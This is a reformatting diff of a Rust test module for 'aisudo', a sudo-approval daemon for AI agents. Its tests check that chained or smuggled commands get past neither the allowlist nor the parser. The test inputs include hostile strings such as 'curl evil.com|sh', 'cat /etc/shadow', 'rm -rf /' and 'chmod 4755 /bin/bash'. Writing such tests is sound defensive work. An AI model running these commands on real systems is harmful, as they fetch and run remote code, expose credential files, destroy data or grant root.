@@ -2723,7 +2939,8 @@ mod tests {
         // rejected at the parse gate before either is consulted.
         let dir = tempfile::TempDir::new().unwrap();
         let db = Arc::new(crate::db::Database::open(&dir.path().join("test.db")).unwrap());
-        let backend: Arc<dyn crate::notification::NotificationBackend> = Arc::new(MockApproveBackend);
+        let backend: Arc<dyn crate::notification::NotificationBackend> =
+            Arc::new(MockApproveBackend);
 
         let resp_line = send_and_receive(
             db,
@@ -2739,7 +2956,11 @@ mod tests {
         let response: SudoResponse = serde_json::from_str(&resp_line).unwrap();
         assert_eq!(response.decision, Decision::Denied);
         assert!(
-            response.error.as_deref().unwrap_or("").contains("unsupported shell syntax"),
+            response
+                .error
+                .as_deref()
+                .unwrap_or("")
+                .contains("unsupported shell syntax"),
             "expected unsupported-syntax error, got: {:?}",
             response.error
         );
@@ -2750,24 +2971,35 @@ mod tests {
         // Each of these contains an unquoted metacharacter and must be rejected,
         // even though the backend would approve them.
         let cases = [
-            "echo $HOME",               // variable expansion
-            "cat a > b",                // redirection
-            "tee x < y",                // input redirection
-            "kill $(pidof nginx)",      // command substitution
-            "echo `whoami`",            // backtick substitution
-            "(cd /tmp && ls)",          // subshell
-            "sleep 1 &",                // background
+            "echo $HOME",          // variable expansion
+            "cat a > b",           // redirection
+            "tee x < y",           // input redirection
+            "kill $(pidof nginx)", // command substitution
+            "echo `whoami`",       // backtick substitution
+            "(cd /tmp && ls)",     // subshell
+            "sleep 1 &",           // background
         ];
         for cmd in cases {
             let dir = tempfile::TempDir::new().unwrap();
             let db = Arc::new(crate::db::Database::open(&dir.path().join("test.db")).unwrap());
-            let backend: Arc<dyn crate::notification::NotificationBackend> = Arc::new(MockApproveBackend);
+            let backend: Arc<dyn crate::notification::NotificationBackend> =
+                Arc::new(MockApproveBackend);
             let resp_line = send_and_receive(
-                db, backend, &pam_req(cmd), &[], &[], &std::collections::HashMap::new(), test_limits(),
+                db,
+                backend,
+                &pam_req(cmd),
+                &[],
+                &[],
+                &std::collections::HashMap::new(),
+                test_limits(),
             )
             .await;
             let response: SudoResponse = serde_json::from_str(&resp_line).unwrap();
-            assert_eq!(response.decision, Decision::Denied, "command should be rejected: {cmd}");
+            assert_eq!(
+                response.decision,
+                Decision::Denied,
+                "command should be rejected: {cmd}"
+            );
         }
     }
 
@@ -2777,7 +3009,8 @@ mod tests {
         // metacharacters, so it parses and can be human-approved as normal.
         let dir = tempfile::TempDir::new().unwrap();
         let db = Arc::new(crate::db::Database::open(&dir.path().join("test.db")).unwrap());
-        let backend: Arc<dyn crate::notification::NotificationBackend> = Arc::new(MockApproveBackend);
+        let backend: Arc<dyn crate::notification::NotificationBackend> =
+            Arc::new(MockApproveBackend);
 
         let resp_line = send_and_receive(
             db,
@@ -2798,7 +3031,8 @@ mod tests {
     async fn notification_approval_flow() {
         let dir = tempfile::TempDir::new().unwrap();
         let db = Arc::new(crate::db::Database::open(&dir.path().join("test.db")).unwrap());
-        let backend: Arc<dyn crate::notification::NotificationBackend> = Arc::new(MockApproveBackend);
+        let backend: Arc<dyn crate::notification::NotificationBackend> =
+            Arc::new(MockApproveBackend);
 
         let request = SudoRequest {
             user: "testuser".to_string(),
@@ -2814,7 +3048,16 @@ mod tests {
         };
         let json = serde_json::to_string(&request).unwrap();
 
-        let resp_line = send_and_receive(db, backend, &json, &[], &[], &std::collections::HashMap::new(), test_limits()).await;
+        let resp_line = send_and_receive(
+            db,
+            backend,
+            &json,
+            &[],
+            &[],
+            &std::collections::HashMap::new(),
+            test_limits(),
+        )
+        .await;
 
         let response: SudoResponse = serde_json::from_str(&resp_line).unwrap();
         assert_eq!(response.decision, Decision::Approved);
@@ -2840,7 +3083,16 @@ mod tests {
         };
         let json = serde_json::to_string(&request).unwrap();
 
-        let resp_line = send_and_receive(db, backend, &json, &[], &[], &std::collections::HashMap::new(), test_limits()).await;
+        let resp_line = send_and_receive(
+            db,
+            backend,
+            &json,
+            &[],
+            &[],
+            &std::collections::HashMap::new(),
+            test_limits(),
+        )
+        .await;
 
         let response: SudoResponse = serde_json::from_str(&resp_line).unwrap();
         assert_eq!(response.decision, Decision::Denied);
@@ -2866,7 +3118,16 @@ mod tests {
         };
         let json = serde_json::to_string(&request).unwrap();
 
-        let resp_line = send_and_receive(db, backend, &json, &[], &[], &std::collections::HashMap::new(), test_limits()).await;
+        let resp_line = send_and_receive(
+            db,
+            backend,
+            &json,
+            &[],
+            &[],
+            &std::collections::HashMap::new(),
+            test_limits(),
+        )
+        .await;
 
         let response: SudoResponse = serde_json::from_str(&resp_line).unwrap();
         assert_eq!(response.decision, Decision::Denied);
@@ -2898,7 +3159,16 @@ mod tests {
         let json = serde_json::to_string(&request).unwrap();
 
         // max_stdin_bytes = 100, so 200-byte stdin should be rejected
-        let resp_line = send_and_receive(db, backend, &json, &[], &[], &std::collections::HashMap::new(), test_limits_with_stdin(100)).await;
+        let resp_line = send_and_receive(
+            db,
+            backend,
+            &json,
+            &[],
+            &[],
+            &std::collections::HashMap::new(),
+            test_limits_with_stdin(100),
+        )
+        .await;
 
         let response: SudoResponse = serde_json::from_str(&resp_line).unwrap();
         assert_eq!(response.decision, Decision::Denied);
@@ -2912,8 +3182,15 @@ mod tests {
         let backend: Arc<dyn crate::notification::NotificationBackend> = Arc::new(MockBackend);
 
         let resp_line = send_and_receive(
-            db, backend, "this is not json", &[], &[], &std::collections::HashMap::new(), test_limits(),
-        ).await;
+            db,
+            backend,
+            "this is not json",
+            &[],
+            &[],
+            &std::collections::HashMap::new(),
+            test_limits(),
+        )
+        .await;
 
         let response: SudoResponse = serde_json::from_str(&resp_line).unwrap();
         assert_eq!(response.decision, Decision::Denied);
@@ -2924,7 +3201,8 @@ mod tests {
     async fn temp_rule_request_duration_exceeds_max() {
         let dir = tempfile::TempDir::new().unwrap();
         let db = Arc::new(crate::db::Database::open(&dir.path().join("test.db")).unwrap());
-        let backend: Arc<dyn crate::notification::NotificationBackend> = Arc::new(MockApproveBackend);
+        let backend: Arc<dyn crate::notification::NotificationBackend> =
+            Arc::new(MockApproveBackend);
 
         let msg = aisudo_common::SocketMessage::TempRuleRequest(aisudo_common::TempRuleRequest {
             user: "testuser".to_string(),
@@ -2937,7 +3215,16 @@ mod tests {
         // max_temp_rule_duration = 3600
         let mut limits = test_limits();
         limits.max_temp_rule_duration_seconds = 3600;
-        let resp_line = send_and_receive(db, backend, &json, &[], &[], &std::collections::HashMap::new(), limits).await;
+        let resp_line = send_and_receive(
+            db,
+            backend,
+            &json,
+            &[],
+            &[],
+            &std::collections::HashMap::new(),
+            limits,
+        )
+        .await;
 
         let response: TempRuleResponse = serde_json::from_str(&resp_line).unwrap();
         assert_eq!(response.decision, Decision::Denied);
@@ -2948,7 +3235,8 @@ mod tests {
     async fn temp_rule_request_empty_patterns() {
         let dir = tempfile::TempDir::new().unwrap();
         let db = Arc::new(crate::db::Database::open(&dir.path().join("test.db")).unwrap());
-        let backend: Arc<dyn crate::notification::NotificationBackend> = Arc::new(MockApproveBackend);
+        let backend: Arc<dyn crate::notification::NotificationBackend> =
+            Arc::new(MockApproveBackend);
 
         let msg = aisudo_common::SocketMessage::TempRuleRequest(aisudo_common::TempRuleRequest {
             user: "testuser".to_string(),
@@ -2958,7 +3246,16 @@ mod tests {
         });
         let json = serde_json::to_string(&msg).unwrap();
 
-        let resp_line = send_and_receive(db, backend, &json, &[], &[], &std::collections::HashMap::new(), test_limits()).await;
+        let resp_line = send_and_receive(
+            db,
+            backend,
+            &json,
+            &[],
+            &[],
+            &std::collections::HashMap::new(),
+            test_limits(),
+        )
+        .await;
 
         let response: TempRuleResponse = serde_json::from_str(&resp_line).unwrap();
         assert_eq!(response.decision, Decision::Denied);
@@ -2969,7 +3266,8 @@ mod tests {
     async fn temp_rule_request_approved_flow() {
         let dir = tempfile::TempDir::new().unwrap();
         let db = Arc::new(crate::db::Database::open(&dir.path().join("test.db")).unwrap());
-        let backend: Arc<dyn crate::notification::NotificationBackend> = Arc::new(MockApproveBackend);
+        let backend: Arc<dyn crate::notification::NotificationBackend> =
+            Arc::new(MockApproveBackend);
 
         let msg = aisudo_common::SocketMessage::TempRuleRequest(aisudo_common::TempRuleRequest {
             user: "testuser".to_string(),
@@ -2979,7 +3277,16 @@ mod tests {
         });
         let json = serde_json::to_string(&msg).unwrap();
 
-        let resp_line = send_and_receive(db, backend, &json, &[], &[], &std::collections::HashMap::new(), test_limits()).await;
+        let resp_line = send_and_receive(
+            db,
+            backend,
+            &json,
+            &[],
+            &[],
+            &std::collections::HashMap::new(),
+            test_limits(),
+        )
+        .await;
 
         let response: TempRuleResponse = serde_json::from_str(&resp_line).unwrap();
         assert_eq!(response.decision, Decision::Approved);
@@ -2999,8 +3306,19 @@ mod tests {
         let now = chrono::Utc::now();
         let future = (now + chrono::Duration::seconds(3600)).to_rfc3339();
         let patterns = serde_json::to_string(&vec!["docker ps"]).unwrap();
-        db.insert_temp_rule("r1", &user, &patterns, 3600, &now.to_rfc3339(), &future, "n1", None).unwrap();
-        db.update_temp_rule_decision("r1", Decision::Approved, "test").unwrap();
+        db.insert_temp_rule(
+            "r1",
+            &user,
+            &patterns,
+            3600,
+            &now.to_rfc3339(),
+            &future,
+            "n1",
+            None,
+        )
+        .unwrap();
+        db.update_temp_rule_decision("r1", Decision::Approved, "test")
+            .unwrap();
 
         let msg = aisudo_common::SocketMessage::ListRules(aisudo_common::ListRulesRequest {
             user: user.clone(),
@@ -3008,9 +3326,15 @@ mod tests {
         let json = serde_json::to_string(&msg).unwrap();
 
         let resp_line = send_and_receive(
-            db, backend, &json,
-            &["apt list".to_string()], &[], &std::collections::HashMap::new(), test_limits(),
-        ).await;
+            db,
+            backend,
+            &json,
+            &["apt list".to_string()],
+            &[],
+            &std::collections::HashMap::new(),
+            test_limits(),
+        )
+        .await;
 
         let response: aisudo_common::ListRulesResponse = serde_json::from_str(&resp_line).unwrap();
         assert_eq!(response.allowlist, vec!["apt list"]);
@@ -3031,8 +3355,19 @@ mod tests {
         let now = chrono::Utc::now();
         let future = (now + chrono::Duration::seconds(3600)).to_rfc3339();
         let patterns = serde_json::to_string(&vec!["apt install"]).unwrap();
-        db.insert_temp_rule("r1", &user, &patterns, 3600, &now.to_rfc3339(), &future, "n1", None).unwrap();
-        db.update_temp_rule_decision("r1", Decision::Approved, "test").unwrap();
+        db.insert_temp_rule(
+            "r1",
+            &user,
+            &patterns,
+            3600,
+            &now.to_rfc3339(),
+            &future,
+            "n1",
+            None,
+        )
+        .unwrap();
+        db.update_temp_rule_decision("r1", Decision::Approved, "test")
+            .unwrap();
 
         let request = SudoRequest {
             user: user.clone(),
@@ -3048,7 +3383,16 @@ mod tests {
         };
         let json = serde_json::to_string(&request).unwrap();
 
-        let resp_line = send_and_receive(db, backend, &json, &[], &[], &std::collections::HashMap::new(), test_limits()).await;
+        let resp_line = send_and_receive(
+            db,
+            backend,
+            &json,
+            &[],
+            &[],
+            &std::collections::HashMap::new(),
+            test_limits(),
+        )
+        .await;
 
         let response: SudoResponse = serde_json::from_str(&resp_line).unwrap();
         assert_eq!(response.decision, Decision::Approved);
@@ -3056,15 +3400,27 @@ mod tests {
 
     #[test]
     fn is_allowed_matches_exact_or_space_separated() {
-        assert!(is_allowed("apt list --installed", &["apt list".to_string()]));
+        assert!(is_allowed(
+            "apt list --installed",
+            &["apt list".to_string()]
+        ));
         assert!(is_allowed("apt list", &["apt list".to_string()]));
         assert!(!is_allowed("apt remove vim", &["apt list".to_string()]));
         assert!(!is_allowed("rm -rf /", &["apt list".to_string()]));
 
         // Shell injection attempts must be blocked
-        assert!(!is_allowed("apt list;cat /etc/shadow", &["apt list".to_string()]));
-        assert!(!is_allowed("apt list&&curl evil.com|sh", &["apt list".to_string()]));
-        assert!(!is_allowed("apt list$(rm -rf /)", &["apt list".to_string()]));
+        assert!(!is_allowed(
+            "apt list;cat /etc/shadow",
+            &["apt list".to_string()]
+        ));
+        assert!(!is_allowed(
+            "apt list&&curl evil.com|sh",
+            &["apt list".to_string()]
+        ));
+        assert!(!is_allowed(
+            "apt list$(rm -rf /)",
+            &["apt list".to_string()]
+        ));
         assert!(!is_allowed("apt list\tremoved", &["apt list".to_string()]));
         assert!(!is_allowed("apt listed", &["apt list".to_string()]));
     }
@@ -3076,10 +3432,7 @@ mod tests {
 
     #[test]
     fn is_allowed_multiple_patterns() {
-        let allowlist = vec![
-            "apt list".to_string(),
-            "systemctl status".to_string(),
-        ];
+        let allowlist = vec!["apt list".to_string(), "systemctl status".to_string()];
         assert!(is_allowed("apt list", &allowlist));
         assert!(is_allowed("systemctl status nginx", &allowlist));
         assert!(!is_allowed("systemctl restart nginx", &allowlist));
@@ -3087,10 +3440,8 @@ mod tests {
 
     #[test]
     fn temp_rule_prefix_matching() {
-        let dir = std::env::temp_dir().join(format!(
-            "aisudo-temp-rule-test-{}",
-            std::process::id()
-        ));
+        let dir =
+            std::env::temp_dir().join(format!("aisudo-temp-rule-test-{}", std::process::id()));
         std::fs::create_dir_all(&dir).unwrap();
         let db = crate::db::Database::open(&dir.join("test.db")).unwrap();
 
@@ -3098,8 +3449,19 @@ mod tests {
         let future = (now + chrono::Duration::seconds(3600)).to_rfc3339();
         let patterns = serde_json::to_string(&vec!["apt install", "apt list"]).unwrap();
 
-        db.insert_temp_rule("r1", "alice", &patterns, 3600, &now.to_rfc3339(), &future, "n1", None).unwrap();
-        db.update_temp_rule_decision("r1", Decision::Approved, "test").unwrap();
+        db.insert_temp_rule(
+            "r1",
+            "alice",
+            &patterns,
+            3600,
+            &now.to_rfc3339(),
+            &future,
+            "n1",
+            None,
+        )
+        .unwrap();
+        db.update_temp_rule_decision("r1", Decision::Approved, "test")
+            .unwrap();
 
         // Exact match and space-separated args
         assert!(is_temp_rule_allowed(&db, "alice", "apt install vim").unwrap());
@@ -3128,7 +3490,11 @@ mod tests {
     fn strip_allows_legitimate_wrapped_command() {
         let allow = vec!["systemctl restart".to_string(), "df".to_string()];
         // The intended use of strip_shell_prefix: a wrapped allowlisted command.
-        assert!(is_allowed_with_strip("bash -c 'systemctl restart foo'", &allow, true));
+        assert!(is_allowed_with_strip(
+            "bash -c 'systemctl restart foo'",
+            &allow,
+            true
+        ));
         assert!(is_allowed_with_strip("df -h", &allow, true));
         assert!(is_allowed_with_strip("env bash -c 'df'", &allow, true));
     }
@@ -3139,11 +3505,27 @@ mod tests {
         // whole-command strip would collapse to `df`. The chmod segment is not
         // allowlisted, so the whole command is rejected.
         let allow = vec!["df".to_string()];
-        assert!(!is_allowed_with_strip("bash -c df ; chmod 4755 /bin/bash", &allow, true));
-        assert!(!is_allowed_with_strip("bash -c df && rm -rf /tmp/x", &allow, true));
-        assert!(!is_allowed_with_strip("bash -c df | tee /etc/passwd", &allow, true));
+        assert!(!is_allowed_with_strip(
+            "bash -c df ; chmod 4755 /bin/bash",
+            &allow,
+            true
+        ));
+        assert!(!is_allowed_with_strip(
+            "bash -c df && rm -rf /tmp/x",
+            &allow,
+            true
+        ));
+        assert!(!is_allowed_with_strip(
+            "bash -c df | tee /etc/passwd",
+            &allow,
+            true
+        ));
         // Quoted operators inside the wrapper are caught too (inner is re-parsed).
-        assert!(!is_allowed_with_strip("bash -c 'df ; rm -rf /'", &allow, true));
+        assert!(!is_allowed_with_strip(
+            "bash -c 'df ; rm -rf /'",
+            &allow,
+            true
+        ));
     }
 
     #[test]
@@ -3151,7 +3533,11 @@ mod tests {
         let allow = vec!["df".to_string()];
         // With the feature off, behaviour is exactly is_allowed: a wrapped command
         // is matched literally (and `bash -c df` is not allowlisted).
-        assert!(!is_allowed_with_strip("bash -c df ; chmod 4755 /bin/bash", &allow, false));
+        assert!(!is_allowed_with_strip(
+            "bash -c df ; chmod 4755 /bin/bash",
+            &allow,
+            false
+        ));
         assert!(is_allowed_with_strip("df -h", &allow, false));
     }
 
@@ -3159,31 +3545,57 @@ mod tests {
     fn strip_denylist_inspects_each_segment() {
         let deny = vec!["chmod".to_string()];
         // The smuggled chmod segment is now visible to the denylist.
-        assert!(is_denied_with_strip("bash -c df ; chmod 4755 /bin/bash", &deny, true));
+        assert!(is_denied_with_strip(
+            "bash -c df ; chmod 4755 /bin/bash",
+            &deny,
+            true
+        ));
         assert!(!is_denied_with_strip("bash -c df ; ls -la", &deny, true));
     }
 
     #[test]
     fn strip_temp_rule_blocks_smuggled_chain() {
-        let dir = std::env::temp_dir().join(format!(
-            "aisudo-h1-temp-test-{}",
-            std::process::id()
-        ));
+        let dir = std::env::temp_dir().join(format!("aisudo-h1-temp-test-{}", std::process::id()));
         std::fs::create_dir_all(&dir).unwrap();
         let db = crate::db::Database::open(&dir.join("test.db")).unwrap();
 
         let now = chrono::Utc::now();
         let future = (now + chrono::Duration::seconds(3600)).to_rfc3339();
         let patterns = serde_json::to_string(&vec!["docker ps"]).unwrap();
-        db.insert_temp_rule("r1", "alice", &patterns, 3600, &now.to_rfc3339(), &future, "n1", None).unwrap();
-        db.update_temp_rule_decision("r1", Decision::Approved, "test").unwrap();
+        db.insert_temp_rule(
+            "r1",
+            "alice",
+            &patterns,
+            3600,
+            &now.to_rfc3339(),
+            &future,
+            "n1",
+            None,
+        )
+        .unwrap();
+        db.update_temp_rule_decision("r1", Decision::Approved, "test")
+            .unwrap();
 
         // Legitimate wrapped temp-rule command is allowed.
-        assert!(is_temp_rule_allowed_with_strip(&db, "alice", "bash -c 'docker ps'", true).unwrap());
+        assert!(
+            is_temp_rule_allowed_with_strip(&db, "alice", "bash -c 'docker ps'", true).unwrap()
+        );
         // Smuggled extra segment is blocked even though strip would collapse to `docker ps`.
-        assert!(!is_temp_rule_allowed_with_strip(&db, "alice", "bash -c 'docker ps' ; rm -rf /", true).unwrap());
+        assert!(!is_temp_rule_allowed_with_strip(
+            &db,
+            "alice",
+            "bash -c 'docker ps' ; rm -rf /",
+            true
+        )
+        .unwrap());
         // Quoted operator inside the wrapper is caught too.
-        assert!(!is_temp_rule_allowed_with_strip(&db, "alice", "bash -c 'docker ps ; rm -rf /'", true).unwrap());
+        assert!(!is_temp_rule_allowed_with_strip(
+            &db,
+            "alice",
+            "bash -c 'docker ps ; rm -rf /'",
+            true
+        )
+        .unwrap());
 
         std::fs::remove_dir_all(&dir).ok();
     }
@@ -3290,7 +3702,10 @@ mod tests {
     #[test]
     fn parse_rejects_newline() {
         let err = parse_command_chain("apt list\nrm -rf /").unwrap_err();
-        assert!(err.contains("newline"), "error should mention newline: {err}");
+        assert!(
+            err.contains("newline"),
+            "error should mention newline: {err}"
+        );
     }
 
     #[test]
@@ -3415,8 +3830,19 @@ mod tests {
         let now = chrono::Utc::now();
         let future = (now + chrono::Duration::seconds(3600)).to_rfc3339();
         let patterns = serde_json::to_string(&vec!["apt list", "grep"]).unwrap();
-        db.insert_temp_rule("r1", "alice", &patterns, 3600, &now.to_rfc3339(), &future, "n1", None).unwrap();
-        db.update_temp_rule_decision("r1", Decision::Approved, "test").unwrap();
+        db.insert_temp_rule(
+            "r1",
+            "alice",
+            &patterns,
+            3600,
+            &now.to_rfc3339(),
+            &future,
+            "n1",
+            None,
+        )
+        .unwrap();
+        db.update_temp_rule_decision("r1", Decision::Approved, "test")
+            .unwrap();
 
         assert!(is_temp_rule_allowed(&db, "alice", "apt list | grep vim").unwrap());
     }
@@ -3428,8 +3854,19 @@ mod tests {
         let now = chrono::Utc::now();
         let future = (now + chrono::Duration::seconds(3600)).to_rfc3339();
         let patterns = serde_json::to_string(&vec!["apt list"]).unwrap();
-        db.insert_temp_rule("r1", "alice", &patterns, 3600, &now.to_rfc3339(), &future, "n1", None).unwrap();
-        db.update_temp_rule_decision("r1", Decision::Approved, "test").unwrap();
+        db.insert_temp_rule(
+            "r1",
+            "alice",
+            &patterns,
+            3600,
+            &now.to_rfc3339(),
+            &future,
+            "n1",
+            None,
+        )
+        .unwrap();
+        db.update_temp_rule_decision("r1", Decision::Approved, "test")
+            .unwrap();
 
         assert!(!is_temp_rule_allowed(&db, "alice", "apt list | rm -rf /").unwrap());
     }
@@ -3441,8 +3878,19 @@ mod tests {
         let now = chrono::Utc::now();
         let future = (now + chrono::Duration::seconds(3600)).to_rfc3339();
         let patterns = serde_json::to_string(&vec!["apt list", "dpkg -l"]).unwrap();
-        db.insert_temp_rule("r1", "alice", &patterns, 3600, &now.to_rfc3339(), &future, "n1", None).unwrap();
-        db.update_temp_rule_decision("r1", Decision::Approved, "test").unwrap();
+        db.insert_temp_rule(
+            "r1",
+            "alice",
+            &patterns,
+            3600,
+            &now.to_rfc3339(),
+            &future,
+            "n1",
+            None,
+        )
+        .unwrap();
+        db.update_temp_rule_decision("r1", Decision::Approved, "test")
+            .unwrap();
 
         assert!(is_temp_rule_allowed(&db, "alice", "apt list ; dpkg -l").unwrap());
     }
@@ -3534,8 +3982,15 @@ mod tests {
         let denylist = vec!["apt install vim".to_string()];
         let allowlist = vec!["apt install".to_string()];
         let resp_line = send_and_receive(
-            db, backend, &json, &allowlist, &denylist, &std::collections::HashMap::new(), test_limits()
-        ).await;
+            db,
+            backend,
+            &json,
+            &allowlist,
+            &denylist,
+            &std::collections::HashMap::new(),
+            test_limits(),
+        )
+        .await;
 
         let response: SudoResponse = serde_json::from_str(&resp_line).unwrap();
         assert_eq!(response.decision, Decision::Denied);
@@ -3554,7 +4009,7 @@ mod tests {
         // Global allowlist has "apt list", per-user has "docker ps"
         let mut per_user = std::collections::HashMap::new();
         per_user.insert(real_user.clone(), vec!["docker ps".to_string()]);
-        
+
         // Test that "docker ps" is allowed for the real user
         let request = SudoRequest {
             user: real_user.clone(),
@@ -3572,8 +4027,15 @@ mod tests {
 
         let allowlist = vec!["apt list".to_string()]; // global
         let resp_line = send_and_receive(
-            db.clone(), Arc::clone(&backend), &json, &allowlist, &[], &per_user, test_limits()
-        ).await;
+            db.clone(),
+            Arc::clone(&backend),
+            &json,
+            &allowlist,
+            &[],
+            &per_user,
+            test_limits(),
+        )
+        .await;
 
         let response: SudoResponse = serde_json::from_str(&resp_line).unwrap();
         assert_eq!(response.decision, Decision::Approved);
@@ -3594,8 +4056,15 @@ mod tests {
         let json2 = serde_json::to_string(&request2).unwrap();
 
         let resp_line2 = send_and_receive(
-            db, backend, &json2, &allowlist, &[], &per_user, test_limits()
-        ).await;
+            db,
+            backend,
+            &json2,
+            &allowlist,
+            &[],
+            &per_user,
+            test_limits(),
+        )
+        .await;
 
         let response2: SudoResponse = serde_json::from_str(&resp_line2).unwrap();
         assert_eq!(response2.decision, Decision::Approved);
@@ -3604,49 +4073,76 @@ mod tests {
     // strip_shell_wrapper tests
     #[test]
     fn strip_bash_c_single_quotes() {
-        assert_eq!(strip_shell_wrapper("bash -c 'systemctl restart foo'"), "systemctl restart foo");
+        assert_eq!(
+            strip_shell_wrapper("bash -c 'systemctl restart foo'"),
+            "systemctl restart foo"
+        );
     }
 
     #[test]
     fn strip_bash_c_double_quotes() {
-        assert_eq!(strip_shell_wrapper("bash -c \"systemctl restart foo\""), "systemctl restart foo");
+        assert_eq!(
+            strip_shell_wrapper("bash -c \"systemctl restart foo\""),
+            "systemctl restart foo"
+        );
     }
 
     #[test]
     fn strip_sh_c_single_quotes() {
-        assert_eq!(strip_shell_wrapper("sh -c 'apt install vim'"), "apt install vim");
+        assert_eq!(
+            strip_shell_wrapper("sh -c 'apt install vim'"),
+            "apt install vim"
+        );
     }
 
     #[test]
     fn strip_bare_bash() {
-        assert_eq!(strip_shell_wrapper("bash systemctl restart foo"), "systemctl restart foo");
+        assert_eq!(
+            strip_shell_wrapper("bash systemctl restart foo"),
+            "systemctl restart foo"
+        );
     }
 
     #[test]
     fn strip_bare_sh() {
-        assert_eq!(strip_shell_wrapper("sh systemctl restart foo"), "systemctl restart foo");
+        assert_eq!(
+            strip_shell_wrapper("sh systemctl restart foo"),
+            "systemctl restart foo"
+        );
     }
 
     #[test]
     fn strip_no_wrapper() {
-        assert_eq!(strip_shell_wrapper("systemctl restart foo"), "systemctl restart foo");
+        assert_eq!(
+            strip_shell_wrapper("systemctl restart foo"),
+            "systemctl restart foo"
+        );
     }
 
     #[test]
     fn strip_bash_with_flags_ignored() {
         // bash -e or bash --login should not be stripped (has flags)
-        assert_eq!(strip_shell_wrapper("bash -e script.sh"), "bash -e script.sh");
+        assert_eq!(
+            strip_shell_wrapper("bash -e script.sh"),
+            "bash -e script.sh"
+        );
     }
 
     #[test]
     fn strip_preserves_inner_quotes() {
-        assert_eq!(strip_shell_wrapper("bash -c 'echo \"hello world\"'"), "echo \"hello world\"");
+        assert_eq!(
+            strip_shell_wrapper("bash -c 'echo \"hello world\"'"),
+            "echo \"hello world\""
+        );
     }
 
     #[test]
     fn strip_unquoted_bash_c() {
         // Unquoted `bash -c CMD arg0 arg1` — real shell only executes CMD
-        assert_eq!(strip_shell_wrapper("bash -c systemctl restart foo"), "systemctl");
+        assert_eq!(
+            strip_shell_wrapper("bash -c systemctl restart foo"),
+            "systemctl"
+        );
     }
 
     // ===== strip_shell_wrapper: absolute paths, env prefix, nesting =====
@@ -3850,7 +4346,10 @@ mod tests {
         let cmd = format!("bash {}", script.display());
         let result = check_binary_ownership(&cmd, &limits);
         assert!(result.is_err(), "bash + non-root script should be rejected");
-        assert!(result.unwrap_err().contains("script"), "error should mention 'script'");
+        assert!(
+            result.unwrap_err().contains("script"),
+            "error should mention 'script'"
+        );
     }
 
     /// Same test with /bin/bash (absolute path to interpreter).
@@ -3870,7 +4369,10 @@ mod tests {
 
         let cmd = format!("/bin/bash {}", script.display());
         let result = check_binary_ownership(&cmd, &limits);
-        assert!(result.is_err(), "/bin/bash + non-root script should be rejected");
+        assert!(
+            result.is_err(),
+            "/bin/bash + non-root script should be rejected"
+        );
     }
 
     /// Verify all interpreter names are checked: python, python3, perl, ruby, node, sh.
@@ -3895,7 +4397,10 @@ mod tests {
             }
             let cmd = format!("{} {}", interp, script.display());
             let result = check_binary_ownership(&cmd, &limits);
-            assert!(result.is_err(), "{interp} + non-root script should be rejected");
+            assert!(
+                result.is_err(),
+                "{interp} + non-root script should be rejected"
+            );
         }
     }
 
@@ -3925,7 +4430,10 @@ mod tests {
 
         let cmd = format!("bash {}", script.display());
         let result = check_binary_ownership(&cmd, &limits);
-        assert!(result.is_ok(), "bash + script owned by allowed UID should pass");
+        assert!(
+            result.is_ok(),
+            "bash + script owned by allowed UID should pass"
+        );
     }
 
     /// Interpreter + world-writable script should be rejected even if owner is allowed.
@@ -3944,7 +4452,10 @@ mod tests {
 
         let cmd = format!("bash {}", script.display());
         let result = check_binary_ownership(&cmd, &limits);
-        assert!(result.is_err(), "bash + world-writable script should be rejected");
+        assert!(
+            result.is_err(),
+            "bash + world-writable script should be rejected"
+        );
         assert!(result.unwrap_err().contains("world-writable"));
     }
 
@@ -3967,7 +4478,10 @@ mod tests {
         if which::which("python3").is_ok() {
             let cmd = format!("python3 -u {}", script.display());
             let result = check_binary_ownership(&cmd, &limits);
-            assert!(result.is_err(), "python3 -u + non-root script should be rejected");
+            assert!(
+                result.is_err(),
+                "python3 -u + non-root script should be rejected"
+            );
         }
     }
 
